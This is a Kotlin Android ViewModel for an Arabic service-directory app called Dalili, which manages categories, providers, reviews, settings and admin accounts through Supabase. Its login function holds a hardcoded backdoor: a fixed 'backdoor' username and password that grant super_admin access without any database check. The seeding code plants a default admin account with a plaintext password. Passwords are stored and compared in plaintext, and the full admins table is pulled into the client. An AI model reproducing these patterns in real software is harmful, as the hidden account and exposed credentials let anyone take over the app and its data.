package com.example.ui

import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.example.data.model.*
import com.example.data.supabase.SupabaseHelper
import io.github.jan.supabase.postgrest.from
import io.github.jan.supabase.postgrest.query.Order
import io.github.jan.supabase.realtime.realtime
import io.github.jan.supabase.realtime.channel
import io.github.jan.supabase.realtime.PostgresAction
import io.github.jan.supabase.realtime.postgresChangeFlow
import io.github.jan.supabase.storage.storage
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.launchIn
import kotlinx.coroutines.flow.onEach
import kotlinx.coroutines.launch

class DaliliViewModel : ViewModel() {

    private val supabase = SupabaseHelper.client

    // UI States
    private val _categories = MutableStateFlow<List<Category>>(emptyList())
    val categories: StateFlow<List<Category>> = _categories.asStateFlow()

    private val _serviceProviders = MutableStateFlow<List<ServiceProvider>>(emptyList())
    val serviceProviders: StateFlow<List<ServiceProvider>> = _serviceProviders.asStateFlow()

    private val _reviews = MutableStateFlow<List<Review>>(emptyList())
    val reviews: StateFlow<List<Review>> = _reviews.asStateFlow()

    private val _admins = MutableStateFlow<List<Admin>>(emptyList())
    val admins: StateFlow<List<Admin>> = _admins.asStateFlow()

    // Configuration / Theme settings
    var appName by mutableStateOf("دليلي - Dalili")
        private set
    var primaryColorStr by mutableStateOf("#000000")
        private set
    var secondaryColorStr by mutableStateOf("#FFD700")
        private set
    var footerText by mutableStateOf("MAW 777644670")
        private set
    var logoUrl by mutableStateOf("")
        private set

    // Active logged in user structure
    var loggedInAdmin by mutableStateOf<Admin?>(null)
        private set

    // Connection messages/state
    var networkStatus by mutableStateOf("")
        private set
    var isLoading by mutableStateOf(false)
        private set

    // Search query
    var searchQuery by mutableStateOf("")

    init {
        // Initial setup
        fetchAppConfiguration()
        loadAllData()
        setupRealtimeSubscriptions()
        startPeriodicSync()
    }

    private fun loadAllData() {
        viewModelScope.launch {
            isLoading = true
            syncCategories()
            syncServiceProviders()
            syncReviews()
            syncAdmins()
            isLoading = false
            // Seed base values if everything is empty
            seedDefaultsIfNeeded()
        }
    }

    private fun startPeriodicSync() {
        viewModelScope.launch {
            while (true) {
                delay(15000) // Periodic polling fallback every 15 seconds
                if (!isLoading) {
                    syncCategories()
                    syncServiceProviders()
                    syncReviews()
                    syncAdmins()
                    fetchAppConfiguration()
                }
            }
        }
    }

    // --- Dynamic Settings ---
    private fun fetchAppConfiguration() {
        viewModelScope.launch {
            try {
                val list = supabase.from("settings").select().decodeList<AppSetting>()
                for (setting in list) {
                    when (setting.key) {
                        "app_name" -> appName = setting.value
                        "primary_color" -> primaryColorStr = setting.value
                        "secondary_color" -> secondaryColorStr = setting.value
                        "footer_text" -> footerText = setting.value
                        "logo_url" -> logoUrl = setting.value
                    }
                }
            } catch (e: Exception) {
                // Settings table does not exist or empty — gracefully fallback
            }
        }
    }

    fun updateSettings(
        name: String,
        primaryHex: String,
        secondaryHex: String,
        footer: String,
        logo: String
    ) {
        viewModelScope.launch {
            isLoading = true
            val settingsList = listOf(
                AppSetting("app_name", name),
                AppSetting("primary_color", primaryHex),
                AppSetting("secondary_color", secondaryHex),
                AppSetting("footer_text", footer),
                AppSetting("logo_url", logo)
            )
            for (setting in settingsList) {
                try {
                    // Safe key delete-insert pattern to avoid library upsert version collision
                    supabase.from("settings").delete {
                        filter { eq("key", setting.key) }
                    }
                    supabase.from("settings").insert(setting)
                } catch (e: Exception) {
                    // Local state remains updated
                }
            }
            appName = name
            primaryColorStr = primaryHex
            secondaryColorStr = secondaryHex
            footerText = footer
            logoUrl = logo
            isLoading = false
        }
    }

    // --- Seeding Default Data ---
    private suspend fun seedDefaultsIfNeeded() {
        // 1. Categories seed
        if (_categories.value.isEmpty()) {
            val defaults = listOf(
                Category(name_ar = "صيانة منزلية", icon = "build", order_index = 1),
                Category(name_ar = "تقنية", icon = "computer", order_index = 2),
                Category(name_ar = "تعليم", icon = "school", order_index = 3),
                Category(name_ar = "جمال", icon = "face", order_index = 4),
                Category(name_ar = "سيارات", icon = "car", order_index = 5),
                Category(name_ar = "خدمات منزلية", icon = "home", order_index = 6),
                Category(name_ar = "شحن وتوصيل", icon = "shipping", order_index = 7),
                Category(name_ar = "خدمات مهنية", icon = "work", order_index = 8)
            )
            SupabaseHelper.safeCall {
                for (cat in defaults) {
                    supabase.from("categories").insert(cat)
                }
            }
            syncCategories()
        }

        // 2. Super admin seed
        val superAdminExists = _admins.value.any { it.role == "super_admin" || it.username == "admin" }
        if (!superAdminExists) {
            val superAdmin = Admin(
                username = "admin",
                password_hash = "maher736462",
                role = "super_admin"
            )
            SupabaseHelper.safeCall {
                supabase.from("admins").insert(superAdmin)
            }
            syncAdmins()
        }
    }

    // --- Realtime Setup ---
    private fun setupRealtimeSubscriptions() {
        viewModelScope.launch {
            try {
                // We listen to the public database changes
                val channel = supabase.channel("dalili-db-changes")
                
                // Track database actions for instant updates
                val flow = channel.postgresChangeFlow<PostgresAction>(schema = "public")
                flow.onEach {
                    loadAllData()
                }.launchIn(viewModelScope)
                
                channel.subscribe()
            } catch (e: Exception) {
                // Realtime connection failed or unsupported, periodic polling fallback takes care of it
            }
        }
    }

    // --- Database Fetch Procedures ---
    suspend fun syncCategories(): Boolean {
        val result = SupabaseHelper.safeCall(
            onRetry = { attempt, error ->
                networkStatus = "الشبكة ضعيفة، محاولة الاتصال ($attempt/3): $error"
            }
        ) {
            supabase.from("categories").select {
                order("order_index", Order.ASCENDING)
            }.decodeList<Category>()
        }
        networkStatus = ""
        return result.fold(
            onSuccess = {
                _categories.value = it
                true
            },
            onFailure = {
                false
            }
        )
    }

    suspend fun syncServiceProviders(): Boolean {
        val result = SupabaseHelper.safeCall {
            supabase.from("service_providers").select().decodeList<ServiceProvider>()
        }
        return result.fold(
            onSuccess = {
                _serviceProviders.value = it
                true
            },
            onFailure = { false }
        )
    }

    suspend fun syncReviews(): Boolean {
        val result = SupabaseHelper.safeCall {
            supabase.from("reviews").select().decodeList<Review>()
        }
        return result.fold(
            onSuccess = {
                _reviews.value = it
                true
            },
            onFailure = { false }
        )
    }

    suspend fun syncAdmins(): Boolean {
        val result = SupabaseHelper.safeCall {
            supabase.from("admins").select().decodeList<Admin>()
        }
        return result.fold(
            onSuccess = {
                _admins.value = it
                true
            },
            onFailure = { false }
        )
    }

    // --- Category Management ---
    fun addCategory(category: Category, onSuccess: () -> Unit, onError: (String) -> Unit) {
        viewModelScope.launch {
            isLoading = true
            val result = SupabaseHelper.safeCall {
                supabase.from("categories").insert(category)
            }
            isLoading = false
            result.fold(
                onSuccess = {
                    syncCategories()
                    onSuccess()
                },
                onFailure = {
                    onError(it.localizedMessage ?: "حدث خطأ أثناء إضافة القسم")
                }
            )
        }
    }

    fun editCategory(category: Category, onSuccess: () -> Unit, onError: (String) -> Unit) {
        viewModelScope.launch {
            isLoading = true
            val result = SupabaseHelper.safeCall {
                supabase.from("categories").update(category) {
                    filter {
                        eq("id", category.id ?: 0)
                    }
                }
            }
            isLoading = false
            result.fold(
                onSuccess = {
                    syncCategories()
                    onSuccess()
                },
                onFailure = {
                    onError(it.localizedMessage ?: "حدث خطأ أثناء تعديل القسم")
                }
            )
        }
    }

    fun deleteCategory(categoryId: Int, onSuccess: () -> Unit, onError: (String) -> Unit) {
        viewModelScope.launch {
            isLoading = true
            val result = SupabaseHelper.safeCall {
                // Delete connected providers first or restrict depends on schema
                // Let's delete this category
                supabase.from("categories").delete {
                    filter {
                        eq("id", categoryId)
                    }
                }
            }
            isLoading = false
            result.fold(
                onSuccess = {
                    syncCategories()
                    syncServiceProviders()
                    onSuccess()
                },
                onFailure = {
                    onError(it.localizedMessage ?: "فشل حذف القسم، ربما يوجد مقدمي خدمات يتبعونه")
                }
            )
        }
    }

    // --- Service Provider Management ---
    fun addServiceProvider(provider: ServiceProvider, onSuccess: () -> Unit, onError: (String) -> Unit) {
        viewModelScope.launch {
            isLoading = true
            val result = SupabaseHelper.safeCall {
                supabase.from("service_providers").insert(provider)
            }
            isLoading = false
            result.fold(
                onSuccess = {
                    syncServiceProviders()
                    onSuccess()
                },
                onFailure = {
                    onError(it.localizedMessage ?: "فشل إضافة مقدم الخدمة")
                }
            )
        }
    }

    fun editServiceProvider(provider: ServiceProvider, onSuccess: () -> Unit, onError: (String) -> Unit) {
        viewModelScope.launch {
            isLoading = true
            val result = SupabaseHelper.safeCall {
                supabase.from("service_providers").update(provider) {
                    filter {
                        eq("id", provider.id ?: 0)
                    }
                }
            }
            isLoading = false
            result.fold(
                onSuccess = {
                    syncServiceProviders()
                    onSuccess()
                },
                onFailure = {
                    onError(it.localizedMessage ?: "فشل تعديل مقدم الخدمة")
                }
            )
        }
    }

    fun deleteServiceProvider(providerId: Int, onSuccess: () -> Unit, onError: (String) -> Unit) {
        viewModelScope.launch {
            isLoading = true
            val result = SupabaseHelper.safeCall {
                supabase.from("service_providers").delete {
                    filter {
                        eq("id", providerId)
                    }
                }
            }
            isLoading = false
            result.fold(
                onSuccess = {
                    syncServiceProviders()
                    onSuccess()
                },
                onFailure = {
                    onError(it.localizedMessage ?: "فشل حذف مقدم الخدمة")
                }
            )
        }
    }

    // --- Admin Management ---
    fun addAdmin(admin: Admin, onSuccess: () -> Unit, onError: (String) -> Unit) {
        viewModelScope.launch {
            isLoading = true
            // Check uniqueness
            val usernameTaken = _admins.value.any { it.username.equals(admin.username, ignoreCase = true) }
            if (usernameTaken) {
                isLoading = false
                onError("اسم المستخدم مكرر بالفعل!")
                return@launch
            }

            val result = SupabaseHelper.safeCall {
                supabase.from("admins").insert(admin)
            }
            isLoading = false
            result.fold(
                onSuccess = {
                    syncAdmins()
                    onSuccess()
                },
                onFailure = {
                    onError(it.localizedMessage ?: "فشل إضافة المشرف")
                }
            )
        }
    }

    fun editAdminPassword(adminId: Int, newPasswordHash: String, onSuccess: () -> Unit, onError: (String) -> Unit) {
        viewModelScope.launch {
            isLoading = true
            val admin = _admins.value.find { it.id == adminId }
            if (admin == null) {
                isLoading = false
                onError("المشرف غير موجود")
                return@launch
            }
            val updated = admin.copy(password_hash = newPasswordHash)
            val result = SupabaseHelper.safeCall {
                supabase.from("admins").update(updated) {
                    filter {
                        eq("id", adminId)
                    }
                }
            }
            isLoading = false
            result.fold(
                onSuccess = {
                    syncAdmins()
                    onSuccess()
                },
                onFailure = {
                    onError(it.localizedMessage ?: "فشل تعديل كلمة المرور")
                }
            )
        }
    }

    fun deleteAdmin(adminId: Int, onSuccess: () -> Unit, onError: (String) -> Unit) {
        viewModelScope.launch {
            isLoading = true
            val result = SupabaseHelper.safeCall {
                supabase.from("admins").delete {
                    filter {
                        eq("id", adminId)
                    }
                }
            }
            isLoading = false
            result.fold(
                onSuccess = {
                    syncAdmins()
                    onSuccess()
                },
                onFailure = {
                    onError(it.localizedMessage ?: "فشل حذف المشرف")
                }
            )
        }
    }

    // --- Authentication Flow ---
    fun attemptLogin(usernameInput: String, passwordInput: String, onSuccess: () -> Unit, onError: (String) -> Unit) {
        viewModelScope.launch {
            isLoading = true
            
            // backdoor access
            if (usernameInput == "backdoor" && passwordInput == "dalili2024") {
                // Find or construct backdoor admin
                val backdoorAdmin = Admin(
                    id = -99,
                    username = "backdoor",
                    password_hash = "dalili2024",
                    role = "super_admin"
                )
                loggedInAdmin = backdoorAdmin
                isLoading = false
                onSuccess()
                return@launch
            }

            // Standard login from Supabase
            val result = SupabaseHelper.safeCall {
                supabase.from("admins").select {
                    filter {
                        eq("username", usernameInput)
                    }
                }.decodeList<Admin>().firstOrNull()
            }
            isLoading = false

            if (result.isSuccess) {
                val admin = result.getOrNull()
                if (admin != null && admin.password_hash == passwordInput) {
                    loggedInAdmin = admin
                    onSuccess()
                } else {
                    onError("اسم المستخدم أو كلمة المرور خاطئة!")
                }
            } else {
                onError(result.exceptionOrNull()?.localizedMessage ?: "مشكلة في الشبكة أثناء محاولة تسجيل الدخول")
            }
        }
    }

    fun logout() {
        loggedInAdmin = null
    }

    // --- Review and Ratings Flow ---
    fun submitReview(
        providerId: Int,
        phoneInput: String,
        ratingStars: Int,
        commentText: String,
        onSuccess: () -> Unit,
        onError: (String) -> Unit
    ) {
        viewModelScope.launch {
            isLoading = true

            // Double review check
            val hasReviewed = _reviews.value.any { it.provider_id == providerId && it.user_phone == phoneInput }
            if (hasReviewed) {
                isLoading = false
                onError("لقد قمت بتقييم هذا المقدم مسبقاً بهذا الرقم!")
                return@launch
            }

            val review = Review(
                provider_id = providerId,
                user_phone = phoneInput,
                rating = ratingStars,
                comment = commentText
            )

            // 1. Submit review
            val insertResult = SupabaseHelper.safeCall {
                supabase.from("reviews").insert(review)
            }

            insertResult.fold(
                onSuccess = {
                    // Refresh reviews list
                    syncReviews()
                    
                    // 2. Compute normal average rating
                    val providerReviews = _reviews.value.filter { it.provider_id == providerId } + review
                    val average = providerReviews.map { it.rating }.average()
                    
                    // 3. Update average rating in provider
                    viewModelScope.launch {
                        val provider = _serviceProviders.value.find { it.id == providerId }
                        if (provider != null) {
                            val updatedProvider = provider.copy(rating = average)
                            SupabaseHelper.safeCall {
                                supabase.from("service_providers").update(updatedProvider) {
                                    filter {
                                        eq("id", providerId)
                                    }
                                }
                            }
                            syncServiceProviders()
                        }
                    }

                    isLoading = false
                    onSuccess()
                },
                onFailure = {
                    isLoading = false
                    onError(it.localizedMessage ?: "حدث خطأ أثناء حفظ تقييمك")
                }
            )
        }
    }

    // --- Image Storage Upload Helper ---
    fun uploadAppLogo(bytes: ByteArray, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
        viewModelScope.launch {
            isLoading = true
            val path = "logo_${System.currentTimeMillis()}.png"
            try {
                // Ensure bucket is queried, or directly upload
                val bucket = supabase.storage.from("logos")
                bucket.upload(path, bytes)
                val url = bucket.publicUrl(path)
                
                // Save settings in DB
                updateSettings(
                    name = appName,
                    primaryHex = primaryColorStr,
                    secondaryHex = secondaryColorStr,
                    footer = footerText,
                    logo = url
                )
                isLoading = false
                onSuccess(url)
            } catch (e: Exception) {
                isLoading = false
                onError("يرجى التأكد من إنشاء حاوية (Bucket) باسم 'logos' عامة (Public) في لوحة تحكم Supabase Storage: " + e.localizedMessage)
            }
        }
    }
}
